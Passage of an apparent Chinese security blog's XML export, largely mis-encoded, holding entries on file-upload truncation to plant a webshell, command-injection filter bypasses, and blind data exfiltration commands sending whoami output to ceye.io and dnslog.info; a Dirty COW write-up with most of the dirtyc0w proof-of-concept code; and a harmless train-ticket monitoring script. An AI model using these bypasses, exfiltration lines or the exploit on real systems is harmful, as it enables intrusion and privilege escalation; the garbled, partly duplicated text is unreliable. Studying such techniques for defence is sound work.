åˆ©ç”¨å†’å·â€œï¼šâ€æˆªæ–­ åˆ©ç”¨â€œ&lt;â€==â€œ*â€è¦†ç›–ä¸Šä¼ æ–‡ä»¶ æˆ‘ä»¬éƒ½çŸ¥é“åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œæˆ‘ä»¬å¾€å¾€ä¼šè€ƒè™‘åˆ°æ–‡ä»¶åæˆªæ–­ï¼Œå¦‚%00,:å»æˆªæ–­ï¼Œå¦‚ï¼šbypass.php:jpgä½†æ˜¯å†’å·æˆªæ–­äº§ç”Ÿçš„æ–‡ä»¶æ˜¯ç©ºç™½çš„ï¼Œé‡Œé¢å¹¶ä¸ä¼šæœ‰ä»»ä½•çš„å†…å®¹,è™½ç„¶ç”Ÿæˆçš„phpæ–‡ä»¶é‡Œé¢æ²¡æœ‰å†…å®¹ï¼Œä½†æ˜¯phpæ–‡ä»¶æ€»ç”Ÿæˆäº†å§ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç»“åˆä¸Šé¢æ‰€è¯´çš„ç‰¹æ€§å®Œç¾æˆåŠŸåˆ©ç”¨. é¦–å…ˆåˆ©ç”¨å†’å·ç”Ÿæˆæˆ‘ä»¬å°†è¦è¦†ç›–çš„phpæ–‡ä»¶ï¼Œä¸Šä¼ æ–‡ä»¶åä¸ºbypass.php:jpgçš„æ–‡ä»¶ï¼Œæˆªæ–­ä¹‹åäº§ç”Ÿä¸€ä¸ªbypass.phpçš„ç©ºç™½phpæ–‡ä»¶ã€‚ åˆ©ç”¨ä¸Šé¢çš„ç³»ç»Ÿç‰¹æ€§è¦†ç›–è¯¥æ–‡ä»¶ï¼š&lt;å°±ç­‰äº *,è€Œ*ä»£è¡¨ä»»æ„å­—ç¬¦burpé‡Œä¿®æ”¹æ–‡ä»¶åä¸ºbypass.&lt;&lt;&lt;å†…å®¹ä¸ºä¸€å¥è¯ï¼Œè¿™æ ·ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªå¸¦æœ‰ä¸€å¥è¯æœ¨é©¬çš„bypass.phpæ–‡ä»¶ã€‚ 0x06 å‘½ä»¤æ‰§è¡Œç»•è¿‡æŠ€å·§æ¥æºï¼šl3m0n escapeshellcmdï¼šescapeshellcmd()å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shellå‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ°exec()æˆ–system()å‡½æ•°ï¼Œæˆ–è€…æ‰§è¡Œæ“ä½œç¬¦ä¹‹å‰è¿›è¡Œè½¬ä¹‰ä¸º^,åˆ©ç”¨%1aï¼Œå¯ä»¥ç»•è¿‡è¿‡æ»¤æ‰§è¡Œå‘½ä»¤ã€‚ é»‘åå•ç»•è¿‡ 1234æ‰§è¡Œlså‘½ä»¤ï¼ša=l;b=s;$a$bcat helloæ–‡ä»¶å†…å®¹ï¼ša=c;b=at;c=he;d=llo;$a$b $&amp;#123;c&amp;#125;$&amp;#123;d&amp;#125; ç©ºæ ¼ç»•è¿‡ 123456ç»•è¿‡ç©ºæ ¼$&amp;#123;IFS&amp;#125;cat$&amp;#123;IFS&amp;#125;helloæˆ–è€…åœ¨è¯»å–æ–‡ä»¶çš„æ—¶å€™åˆ©ç”¨é‡å®šå‘ç¬¦&lt;&gt;cat&lt;&gt;hello æ— å›æ˜¾æ— å›æ˜¾è·å–æ•°æ®çš„éœ€æ±‚è¿˜æ˜¯æŒºå¤§çš„ï¼Œæ¯”å¦‚sqlï¼Œxxeï¼Œxssç­‰ç­‰ï¼Œè¿™ä¸ªæ—¶å€™ä¸€èˆ¬å¯ä»¥ç”¨dns/httpé€šé“æ¥è·å–æ•°æ®ã€‚linuxï¼š 1234curl xxxx.ceye.io/`whoami`ping -c 1 `whoami`.xxxx.ceye.ioç‰¹æ®Šå­—ç¬¦æˆ–è€…æ˜¯ç©ºæ ¼å‡ºç°çš„è¯ï¼Œè¿™æ—¶å€™å¯ä»¥é€šè¿‡ä¸€äº›ç¼–ç æ¥ï¼Œæ¯”å¦‚base64curl http://xxxx.ceye.io/$(id|base64) windows:1234567httpè¯·æ±‚ï¼šfor /F %x in (&apos;whoami&apos;) do start http://xxx.ceye.io/%xdnsè¯·æ±‚ï¼šè·å–è®¡ç®—æœºåï¼šfor /F &quot;delims=\&quot; %i in (&apos;whoami&apos;) do ping -n 1 %i.xxx.dnslog.infoè·å–ç”¨æˆ·åï¼šfor /F &quot;delims=\ tokens=2&quot; %i in (&apos;whoami&apos;) do ping -n 1 %i.xxx.dnslog.infoç”¨powershellæ¥base64æ•°æ®for /F %x in (&apos;whoami&apos;) do powershell $a=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(&apos;%x&apos;));$b=New-Object System.Net.WebClient;$b.DownloadString(&apos;http://xxx.ceye.io/&apos;+$a);]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>PHP</tag>
        <tag>webshell</tag>
        <tag>linux</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
        <tag>æ–‡ä»¶åŒ…å«</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[â€œè„ç‰›â€æ¼æ´æµ…æä¸å¤ç°]]></title>
    <url>%2F2016%2F11%2F02%2F%E2%80%9C%E8%84%8F%E7%89%9B%E2%80%9C%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[0x00 æ¼æ´æ¦‚è¿°Linuxå†…æ ¸çš„å†…å­˜å­ç³»ç»Ÿåœ¨å¤„ç†å†™æ—¶æ‹·è´ï¼ˆCopy-on-Wirteï¼‰æ—¶å­˜åœ¨æ¡ä»¶ç«äº‰æ¼æ´ï¼Œå¯¼è‡´å¯ä»¥ç ´åç§æœ‰åªè¯»å†…å­˜æ˜ å°„ã€‚ä¸€ä¸ªä½æƒé™çš„æœ¬åœ°ç”¨æˆ·èƒ½å¤Ÿåˆ©ç”¨æ­¤æ¼æ´è·å–å…¶ä»–åªè¯»å†…å­˜æ˜ å°„çš„å†™æƒé™ï¼Œæœ‰å¯èƒ½è¿›ä¸€æ­¥å¯¼è‡´ææƒæ¼æ´æ¼æ´ç¼–å·ï¼šCVE-2016-5195 æ¼æ´ç±»å‹ï¼šå†…æ ¸ç«æ€æ¡ä»¶æ¼æ´ æ¼æ´å±å®³ï¼šä½æƒé™ç”¨æˆ·åˆ©ç”¨è¯¥æ¼æ´æŠ€æœ¯å¯ä»¥åœ¨å…¨ç‰ˆæœ¬Liuxç³»ç»Ÿä¸Šå®ç°æœ¬åœ°ææƒ å½±å“èŒƒå›´ï¼šLinuxå†…æ ¸&gt;=2.6.22(07å¹´ä»¥åçš„) 0x01 æ¼æ´åˆ©ç”¨POCåœ°å€ åªè¦Linuxå†…æ ¸&gt;=2.6.22å³å¯ gccå‘½ä»¤æ˜¯ä¸€ä¸ªç¼–è¯‘å™¨å¥—ä»¶ï¼Œå¯ç”¨äºç¼–è¯‘å¤šç§è¯­è¨€æºç . ç¼–è¯‘é€‰é¡¹ä¸­æŒ‡å®š-pthread ä¼šé™„åŠ ä¸€ä¸ªå®å®šä¹‰ -D_REENTRANTè¯¥å®ä¼šå¯¼è‡´ libc å¤´æ–‡ä»¶é€‰æ‹©é‚£äº›thread-safeçš„å®ç°ã€‚-oå‚æ•°ä¸ºç¼–è¯‘åè¾“å‡ºæ–‡ä»¶åã€‚ æ‰§è¡Œå‘½ä»¤è¿›è¡Œå°†Dirty_COWå­—ç¬¦ä¸²ä¿å­˜åˆ°readfileæ–‡ä»¶å†…(å†™å…¥æ–‡ä»¶åå’Œå†…å®¹å¯è‡ªå®šä¹‰ï¼Œä½†æ˜¯å¦‚æœè¯¥æ–‡ä»¶å†…å®¹ä¸ºç©ºï¼Œä¼šå¯¼è‡´POCæµ‹è¯•å¤±è´¥) 0404ä»£è¡¨æ‰€æœ‰ç”¨æˆ·é»˜è®¤æƒ…å†µä¸‹å¯¹è¯¥æ–‡ä»¶åªæœ‰è¯»å–æƒé™ï¼Œæ— æ³•ä¿®æ”¹åˆ é™¤ é€šè¿‡./æ–‡ä»¶å æ–¹å¼æ˜¯æ‰§è¡Œè¯¥æ–‡ä»¶å‘½ä»¤ åé¢ä¸€èˆ¬é™„åŠ ç©ºæ ¼å‚æ•°ã€‚ æ‰§è¡Œdirtyc0wæ–‡ä»¶ readfile æ˜¯æ–‡ä»¶åå‚æ•° m00000...ä¸ºåˆ©ç”¨æ¼æ´å†™å…¥çš„å€¼. å‘ç°è¯¥æ–‡ä»¶å·²è¢«è¾“å…¥çš„å­—ç¬¦ä¸²m0000...è¦†ç›– 0x02 æ¼æ´å½¢æˆåŸå› Linuxå†™æ—¶æ‹·è´æŠ€æœ¯(copy-on-write) åœ¨Linuxç¨‹åºä¸­ï¼Œforkï¼ˆï¼‰ä¼šäº§ç”Ÿä¸€ä¸ªå’Œçˆ¶è¿›ç¨‹å®Œå…¨ç›¸åŒçš„å­è¿›ç¨‹ï¼Œä½†å­è¿›ç¨‹åœ¨æ­¤åå¤šä¼šexecç³»ç»Ÿè°ƒç”¨ï¼Œå‡ºäºæ•ˆç‡è€ƒè™‘ï¼Œlinuxä¸­å¼•å…¥äº†â€œå†™æ—¶å¤åˆ¶â€œæŠ€æœ¯ï¼Œä¹Ÿå°±æ˜¯åªæœ‰è¿›ç¨‹ç©ºé—´çš„å„æ®µçš„å†…å®¹è¦å‘ç”Ÿå˜åŒ–æ—¶ï¼Œæ‰ä¼šå°†çˆ¶è¿›ç¨‹çš„å†…å®¹å¤åˆ¶ä¸€ä»½ç»™å­è¿›ç¨‹ã€‚ ç«æ€æ¡ä»¶ ç«æ€æ¡ä»¶ï¼ˆrace conditionï¼‰æ˜¯æŒ‡è®¾å¤‡æˆ–ç³»ç»Ÿå‡ºç°ä¸æ°å½“çš„æ‰§è¡Œæ—¶åºï¼Œè€Œå¾—åˆ°ä¸æ­£ç¡®çš„ç»“æœã€‚ inuxå†…å­˜ç®¡ç†â€“ç¼ºé¡µå¼‚å¸¸å¤„ç† è§¦å‘å¼‚å¸¸çš„çº¿æ€§åœ°å€å¤„äºç”¨æˆ·ç©ºé—´çš„vmaä¸­ï¼Œä½†è¿˜æœªåˆ†é…ç‰©ç†é¡µï¼Œå¦‚æœè®¿é—®æƒé™OKçš„è¯å†…æ ¸å°±ç»™è¿›ç¨‹åˆ†é…ç›¸åº”çš„ç‰©ç†é¡µã€‚ è§¦å‘å¼‚å¸¸çš„çº¿æ€§åœ°å€ä¸å¤„äºç”¨æˆ·ç©ºé—´çš„vmaä¸­ï¼Œè¿™ç§æƒ…å†µå¾—åˆ¤æ–­æ˜¯ä¸æ˜¯å› ä¸ºç”¨æˆ·è¿›ç¨‹çš„æ ˆç©ºé—´æ¶ˆè€—å®Œè€Œè§¦å‘çš„ç¼ºé¡µå¼‚å¸¸ã€‚ å¦‚æœ æ˜¯çš„è¯åˆ™åœ¨ç”¨æˆ·ç©ºé—´å¯¹æ ˆåŒºåŸŸè¿›è¡Œæ‰©å±•ï¼Œå¹¶ä¸”åˆ†é…ç›¸åº”çš„ç‰©ç†é¡µï¼Œå¦‚æœä¸æ˜¯åˆ™ä½œä¸ºä¸€æ¬¡éæ³•åœ°å€è®¿é—®æ¥å¤„ç†ï¼Œå†…æ ¸å°†ç»ˆç»“è¿›ç¨‹ ç¼ºé¡µä¸­æ–­ ç¼ºé¡µä¸­æ–­å°±æ˜¯è¦è®¿é—®çš„é¡µä¸åœ¨ä¸»å­˜ï¼Œéœ€è¦æ“ä½œç³»ç»Ÿå°†å…¶è°ƒå…¥ä¸»å­˜åå†è¿›è¡Œè®¿é—®ã€‚åœ¨è¿™ä¸ªæ—¶å€™ï¼Œè¢«å†…å­˜æ˜ å°„çš„æ–‡ä»¶å®é™…ä¸Šæˆäº†ä¸€ä¸ªåˆ†é¡µäº¤æ¢æ–‡ä»¶ã€‚ 0x03 è§¦å‘åŸç†ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657void *madviseThread(void *arg)&#123; char *str; str=(char*)arg; int i,c=0; for(i=0;i&lt;100000000;i++) &#123;/*You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661&gt; This is achieved by racing the madvise(MADV_DONTNEED) system call&gt; while having the page of the executable mmapped in memory.*/ c+=madvise(map,100,MADV_DONTNEED); &#125; printf(&quot;madvise %d\n\n&quot;,c);&#125; void *procselfmemThread(void *arg)&#123; char *str; str=(char*)arg;/*You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16&gt; The in the wild exploit we are aware of doesn&apos;t work on Red Hat&gt; Enterprise Linux 5 and 6 out of the box because on one side of&gt; the race it writes to /proc/self/mem, but /proc/self/mem is not&gt; writable on Red Hat Enterprise Linux 5 and 6.*/ int f=open(&quot;/proc/self/mem&quot;,O_RDWR); int i,c=0; for(i=0;i&lt;100000000;i++) &#123;/*You have to reset the file pointer to the memory position.*/ lseek(f,(uintptr_t) map,SEEK_SET); c+=write(f,str,strlen(str)); &#125; printf(&quot;procselfmem %d\n\n&quot;, c);&#125; int main(int argc,char *argv[])&#123;/*You have to pass two arguments. File and Contents.*/ if (argc&lt;3) &#123; (void)fprintf(stderr, &quot;%s\n&quot;, &quot;usage: dirtyc0w target_file new_content&quot;); return 1; &#125; pthread_t pth1,pth2;/*You have to open the file in read only mode.*/ f=open(argv[1],O_RDONLY); fstat(f,&amp;st); name=argv[1]; è°ƒç”¨writeç³»ç»Ÿè°ƒç”¨å‘/proc/self/memæ–‡ä»¶ä¸­å†™å…¥æ•°æ®æ—¶ï¼Œè¿›å…¥å†…æ ¸æ€åå†…æ ¸ä¼šè°ƒç”¨get_user_pageså‡½æ•°è·å–è¦å†™å…¥å†…å­˜åœ°å€ã€‚get_user_pagesä¼šè°ƒç”¨follow_page_maskæ¥è·å–è¿™å—å†…å­˜çš„é¡µè¡¨é¡¹ï¼Œå¹¶åŒæ—¶è¦æ±‚é¡µè¡¨é¡¹æ‰€æŒ‡å‘çš„å†…å­˜æ˜ å°„å…·æœ‰å¯å†™çš„æƒé™ã€‚ ç¬¬ä¸€æ¬¡è·å–å†…å­˜çš„é¡µè¡¨é¡¹ä¼šå› ä¸ºç¼ºé¡µè€Œå¤±è´¥ã€‚get_user_pageè°ƒç”¨faultin_pageè¿›è¡Œç¼ºé¡µå¤„ç†åç¬¬äºŒæ¬¡è°ƒç”¨follow_page_maskè·å–è¿™å—å†…å­˜çš„é¡µè¡¨é¡¹ï¼Œå¦‚æœéœ€è¦è·å–çš„é¡µè¡¨é¡¹æŒ‡å‘çš„æ˜¯ä¸€ä¸ªåªè¯»çš„æ˜ å°„ï¼Œé‚£ç¬¬äºŒæ¬¡è·å–ä¹Ÿä¼šå¤±è´¥ã€‚è¿™æ—¶å€™get_user_pageså‡½æ•°ä¼šç¬¬ä¸‰æ¬¡è°ƒç”¨follow_page_maskæ¥è·å–è¯¥å†…å­˜çš„é¡µè¡¨é¡¹ï¼Œå¹¶ä¸”ä¸å†è¦æ±‚é¡µè¡¨é¡¹æ‰€æŒ‡å‘çš„å†…å­˜æ˜ å°„å…·æœ‰å¯å†™çš„æƒé™ï¼Œè¿™æ—¶æ˜¯å¯ä»¥æˆåŠŸè·å–çš„ï¼Œè·å–æˆåŠŸåå†…æ ¸ä¼šå¯¹è¿™ä¸ªåªè¯»çš„å†…å­˜è¿›è¡Œå¼ºåˆ¶çš„å†™å…¥æ“ä½œã€‚è¿™ä¸ªå®ç°æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œå› ä¸ºæœ¬æ¥å†™å…¥/proc/self/memå°±æ˜¯ä¸€ä¸ªæ— è§†æ˜ å°„æƒé™çš„å¼ºè¡Œå†™å…¥ï¼Œå°±ç®—æ˜¯æ–‡ä»¶æ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜ä¸­ï¼Œä¹Ÿä¸ä¼šå‡ºç°è¶Šæƒå†™ï¼šå¦‚æœå†™å…¥çš„è™šæ‹Ÿå†…å­˜æ˜¯ä¸€ä¸ªVM_PRIVATEçš„æ˜ å°„ï¼Œé‚£åœ¨ç¼ºé¡µçš„æ—¶å€™å†…æ ¸å°±ä¼šæ‰§è¡ŒCOWæ“ä½œäº§ç”Ÿä¸€ä¸ªå‰¯æœ¬æ¥è¿›è¡Œå†™å…¥ï¼Œå†™å…¥çš„å†…å®¹æ˜¯ä¸ä¼šåŒæ­¥åˆ°æ–‡ä»¶ä¸­çš„,å¦‚æœå†™å…¥çš„è™šæ‹Ÿå†…å­˜æ˜¯ä¸€ä¸ªVM_SHAREçš„æ˜ å°„ï¼Œé‚£mmapèƒ½å¤Ÿæ˜ å°„æˆåŠŸçš„å……è¦æ¡ä»¶å°±æ˜¯è¿›ç¨‹æ‹¥æœ‰å¯¹è¯¥æ–‡ä»¶çš„å†™æƒé™ï¼Œè¿™æ ·å†™å…¥çš„å†…å®¹åŒæ­¥åˆ°æ–‡ä»¶ä¸­ä¹Ÿä¸ç®—è¶Šæƒäº†ã€‚&amp;oq=è°ƒç”¨writeç³»ç»Ÿè°ƒç”¨å‘/proc/self/memæ–‡ä»¶ä¸­å†™å…¥æ•°æ®æ—¶ï¼Œè¿›å…¥å†…æ ¸æ€åå†…æ ¸ä¼šè°ƒç”¨get_user_pageså‡½æ•°è·å–è¦å†™å…¥å†…å­˜åœ°å€ã€‚get_user_pagesä¼šè°ƒç”¨follow_page_maskæ¥è·å–è¿™å—å†…å­˜çš„é¡µè¡¨é¡¹ï¼Œå¹¶åŒæ—¶è¦æ±‚é¡µè¡¨é¡¹æ‰€æŒ‡å‘çš„å†…å­˜æ˜ å°„å…·æœ‰å¯å†™çš„æƒé™ã€‚ç¬¬ä¸€æ¬¡è·å–å†…å­˜çš„é¡µè¡¨é¡¹ä¼šå› ä¸ºç¼ºé¡µè€Œå¤±è´¥ã€‚get_user_pageè°ƒç”¨faultin_pageè¿›è¡Œç¼ºé¡µå¤„ç†åç¬¬äºŒæ¬¡è°ƒç”¨follow_page_maskè·å–è¿™å—å†…å­˜çš„é¡µè¡¨é¡¹ï¼Œå¦‚æœéœ€è¦è·å–çš„é¡µè¡¨é¡¹æŒ‡å‘çš„æ˜¯ä¸€ä¸ªåªè¯»çš„æ˜ å°„ï¼Œé‚£ç¬¬äºŒæ¬¡è·å–ä¹Ÿä¼šå¤±è´¥ã€‚è¿™æ—¶å€™get_user_pageså‡½æ•°ä¼šç¬¬ä¸‰æ¬¡è°ƒç”¨follow_page_maskæ¥è·å–è¯¥å†…å­˜çš„é¡µè¡¨é¡¹ï¼Œå¹¶ä¸”ä¸å†è¦æ±‚é¡µè¡¨é¡¹æ‰€æŒ‡å‘çš„å†…å­˜æ˜ å°„å…·æœ‰å¯å†™çš„æƒé™ï¼Œè¿™æ—¶æ˜¯å¯ä»¥æˆåŠŸè·å–çš„ï¼Œè·å–æˆåŠŸåå†…æ ¸ä¼šå¯¹è¿™ä¸ªåªè¯»çš„å†…å­˜è¿›è¡Œå¼ºåˆ¶çš„å†™å…¥æ“ä½œã€‚è¿™ä¸ªå®ç°æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œå› ä¸ºæœ¬æ¥å†™å…¥/proc/self/memå°±æ˜¯ä¸€ä¸ªæ— è§†æ˜ å°„æƒé™çš„å¼ºè¡Œå†™å…¥ï¼Œå°±ç®—æ˜¯æ–‡ä»¶æ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜ä¸­ï¼Œä¹Ÿä¸ä¼šå‡ºç°è¶Šæƒå†™ï¼šå¦‚æœå†™å…¥çš„è™šæ‹Ÿå†…å­˜æ˜¯ä¸€ä¸ªVM_PRIVATEçš„æ˜ å°„ï¼Œé‚£åœ¨ç¼ºé¡µçš„æ—¶å€™å†…æ ¸å°±ä¼šæ‰§è¡ŒCOWæ“ä½œäº§ç”Ÿä¸€ä¸ªå‰¯æœ¬æ¥è¿›è¡Œå†™å…¥ï¼Œå†™å…¥çš„å†…å®¹æ˜¯ä¸ä¼šåŒæ­¥åˆ°æ–‡ä»¶ä¸­çš„.å¦‚æœå†™å…¥çš„è™šæ‹Ÿå†…å­˜æ˜¯ä¸€ä¸ªVM_SHAREçš„æ˜ å°„ï¼Œé‚£mmapèƒ½å¤Ÿæ˜ å°„æˆåŠŸçš„å……è¦æ¡ä»¶å°±æ˜¯è¿›ç¨‹æ‹¥æœ‰å¯¹è¯¥æ–‡ä»¶çš„å†™æƒé™ï¼Œè¿™æ ·å†™å…¥çš„å†…å®¹åŒæ­¥åˆ°æ–‡ä»¶ä¸­ä¹Ÿä¸ç®—è¶Šæƒäº†ã€‚ ä½†æ˜¯ï¼Œåœ¨ä¸Šè¿°æµç¨‹ä¸­ï¼Œå¦‚æœç¬¬äºŒæ¬¡è·å–é¡µè¡¨é¡¹å¤±è´¥ä¹‹åï¼Œå¦ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨madvice(addr,addrlen,MADV_DONTNEED),å…¶ä¸­addr~addrlenæ˜¯ä¸€ä¸ªåªè¯»æ–‡ä»¶çš„VM_PRIVATEçš„åªè¯»å†…å­˜æ˜ å°„ï¼Œé‚£è¯¥æ˜ å°„çš„é¡µè¡¨é¡¹ä¼šè¢«ç½®ç©ºã€‚è¿™æ—¶å¦‚æœget_user_pageså‡½æ•°ç¬¬ä¸‰æ¬¡è°ƒç”¨follow_page_maskæ¥è·å–è¯¥å†…å­˜çš„é¡µè¡¨é¡¹ã€‚ç”±äºè¿™æ¬¡è°ƒç”¨ä¸å†è¦æ±‚è¯¥å†…å­˜æ˜ å°„å…·æœ‰å†™æƒé™ï¼Œæ‰€ä»¥åœ¨ç¼ºé¡µå¤„ç†çš„æ—¶å€™å†…æ ¸ä¹Ÿä¸å†ä¼šæ‰§è¡ŒCOWæ“ä½œäº§ç”Ÿä¸€ä¸ªå‰¯æœ¬ä»¥ä¾›å†™å…¥ã€‚æ‰€ä»¥ç¼ºé¡µå¤„ç†å®Œæˆååç¬¬å››æ¬¡è°ƒç”¨follow_page_maskè·å–è¿™å—å†…å­˜çš„é¡µè¡¨é¡¹çš„æ—¶å€™ï¼Œä¸ä»…å¯ä»¥æˆåŠŸè·å–ï¼Œè€Œä¸”è·å–ä¹‹åå¼ºåˆ¶çš„å†™å…¥çš„å†…å®¹ä¹Ÿä¼šåŒæ­¥åˆ°æ˜ å°„çš„åªè¯»æ–‡ä»¶ä¸­ã€‚ä»è€Œå¯¼è‡´äº†åªè¯»æ–‡ä»¶çš„è¶Šæƒå†™ã€‚ä½†æ˜¯ï¼Œåœ¨ä¸Šè¿°æµç¨‹ä¸­ï¼Œå¦‚æœç¬¬äºŒæ¬¡è·å–é¡µè¡¨é¡¹å¤±è´¥ä¹‹åï¼Œå¦ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨madvice(addr,addrlen,MADV_DONTNEED),å…¶ä¸­addr~addrlenæ˜¯ä¸€ä¸ªåªè¯»æ–‡ä»¶çš„VM_PRIVATEçš„åªè¯»å†…å­˜æ˜ å°„ï¼Œé‚£è¯¥æ˜ å°„çš„é¡µè¡¨é¡¹ä¼šè¢«ç½®ç©ºã€‚è¿™æ—¶å¦‚æœget_user_pageså‡½æ•°ç¬¬ä¸‰æ¬¡è°ƒç”¨follow_page_maskæ¥è·å–è¯¥å†…å­˜çš„é¡µè¡¨é¡¹ã€‚ç”±äºè¿™æ¬¡è°ƒç”¨ä¸å†è¦æ±‚è¯¥å†…å­˜æ˜ å°„å…·æœ‰å†™æƒé™ï¼Œæ‰€ä»¥åœ¨ç¼ºé¡µå¤„ç†çš„æ—¶å€™å†…æ ¸ä¹Ÿä¸å†ä¼šæ‰§è¡ŒCOWæ“ä½œäº§ç”Ÿä¸€ä¸ªå‰¯æœ¬ä»¥ä¾›å†™å…¥ã€‚æ‰€ä»¥ç¼ºé¡µå¤„ç†å®Œæˆååç¬¬å››æ¬¡è°ƒç”¨follow_page_maskè·å–è¿™å—å†…å­˜çš„é¡µè¡¨é¡¹çš„æ—¶å€™ï¼Œä¸ä»…å¯ä»¥æˆåŠŸè·å–ï¼Œè€Œä¸”è·å–ä¹‹åå¼ºåˆ¶çš„å†™å…¥çš„å†…å®¹ä¹Ÿä¼šåŒæ­¥åˆ°æ˜ å°„çš„åªè¯»æ–‡ä»¶ä¸­ã€‚ä»è€Œå¯¼è‡´äº†åªè¯»æ–‡ä»¶çš„è¶Šæƒå†™ã€‚ 0x04 ä¿®å¤å»ºè®®å‡çº§å¯¹åº”ç‰ˆæœ¬.]]></content>
      <tags>
        <tag>è¿ç»´</tag>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>linux</tag>
        <tag>ææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pythonå®ç°12306è½¦ç¥¨æŸ¥è¯¢]]></title>
    <url>%2F2016%2F10%2F10%2FPython%E5%AE%9E%E7%8E%B012306%E8%BD%A6%E7%A5%A8%E6%9F%A5%E8%AF%A2%2F</url>
    <content type="text"><![CDATA[ä»Šå¤©å‡†å¤‡ç»™å¸ˆå‚…ä¸€å—å»åº”æ€¥å“åº”ï¼Œç¥¨éƒ½å®šå¥½äº†ï¼Œå‘ç°å¿˜å¸¦èº«ä»½è¯äº†ï¼ŒMDZZâ€¦æ‰€ä»¥æˆ‘å°±è¿™æ ·é”™å¤±äº†ä¸€æ¬¡å®è´µçš„æœºä¼šâ€¦æ›´â„¢å¯æ¶çš„æ˜¯æˆ‘å»é€€ç¥¨ï¼Œç«Ÿç„¶ç»™æˆ‘è¯´æ²¡æœ‰èº«ä»½è¯é€€ä¸äº†ã€‚ã€‚ã€‚æˆ‘ç‰¹ä¹ˆçš„è¦æ˜¯æœ‰èº«ä»½è¯ï¼Œæˆ‘è¿˜é€€ä½ å¤§çˆ·å•Šã€‚ã€‚ã€‚ æ‰€ä»¥æƒ³æå®ƒï¼Œä¸€æƒ³ï¼Œç®—äº†ï¼Œå‡­æˆ‘è¿™æœ¬äº‹æ12306è¿˜æ˜¯åˆ«è£…é€¼ï¼Œæ‰€ä»¥å°±æœ‰äº†è¿™ä¸ªè„šæœ¬ã€‚ã€‚ã€‚æºä»£ç å¦‚ä¸‹ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#!/usr/bin/python# -*- coding: UTF-8 -*-&apos;&apos;&apos;@Authorï¼šw2n1ck@åšå®¢ï¼šhttp://byd.dropsec.xyz/&apos;&apos;&apos;import urllib2import jsonimport smtplibimport timeimport codecsfrom email.mime.text import MIMETextimport ssl# è®°å½•æ—¥å¿—def log(content): t = time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;) f = codecs.open(&apos;watcher.log&apos;, &apos;a&apos;, &apos;utf-8&apos;) f.write(&apos;[%s]%s\n&apos; % (t, content)) f.close()# å‘é€é‚®ä»¶def send_mail(content): to_list=[&apos;xxx@qq.com&apos;] mail_host = &apos;smtp.163.com&apos; mail_user = &apos;xxx&apos; mail_pass = &apos;xxx&apos; mail_postfix = &apos;163.com&apos; me = &quot;TicketsWatcher&quot;+&quot;&lt;&quot;+mail_user+&quot;@&quot;+mail_postfix+&quot;&gt;&quot; msg = MIMEText(content,_subtype=&apos;plain&apos;,_charset=&apos;gb2312&apos;) msg[&apos;Subject&apos;] = &apos;There are some tickets you need.&apos; msg[&apos;From&apos;] = me msg[&apos;To&apos;] = &quot;;&quot;.join(to_list) server = smtplib.SMTP() server.connect(mail_host) server.ehlo() server.starttls() server.login(mail_user,mail_pass) server.sendmail(me, to_list, msg.as_string()) server.close() log(&apos;sent mail successfully&apos;)try: # è¯·æ±‚åœ°å€æ ¹æ®å®é™…è¦æŠ“å–çš„é¡µé¢ä¿®æ”¹ï¼Œå‚æ•°åŒ…æ‹¬æ—¥æœŸã€å‡ºå‘ç«™ã€åˆ°è¾¾ç«™ ssl._create_default_https_context = ssl._create_unverified_context resp = urllib2.urlopen(&quot;https://kyfw.12306.cn/otn/lcxxcx/query?purpose_codes=ADULT&amp;queryDate=2016-10-11&amp;from_station=NJH&amp;to_station=SHH&quot;) #print resp result = resp.read() #print result data = json.loads(result) datas = data[&apos;data&apos;][&apos;datas&apos;] print datas for d in datas: if d[&apos;station_train_code&apos;] == &apos;T135&apos;: content = &apos;tickes for hard seat of %s: %s&apos; % (d[&apos;station_train_code&apos;], d[&apos;yz_num&apos;]) log(content) if unicode(d[&apos;yz_num&apos;]) != u&quot;æ— &quot;: send_mail(content) breakexcept Exception, e: content = &apos;somethings wrong with the program:\n&apos; + str(e) log(content) send_mail(content) æµ‹è¯•ç»“æœï¼šè¯´æ˜ï¼š è„šæœ¬åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š è®°å½•æ—¥å¿— å‘é€é‚®ä»¶ è½¦ç¥¨ä¿¡æ¯æ•æ‰ è®°å½•æ—¥å¿—ä¼šåœ¨è„šæœ¬ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªwatch.logæ–‡ä»¶ï¼Œè¿™ä¸ªä¸»è¦æ˜¯å¾—ç»“åˆå®æ—¶æ•æ‰æ•°æ®ï¼Œä½ å¯ä»¥å®šæ—¶ä¹Ÿå¯ä»¥ä½¿ç”¨crontab,è¿™é‡Œæˆ‘å°±æ²¡åœ¨åŠ 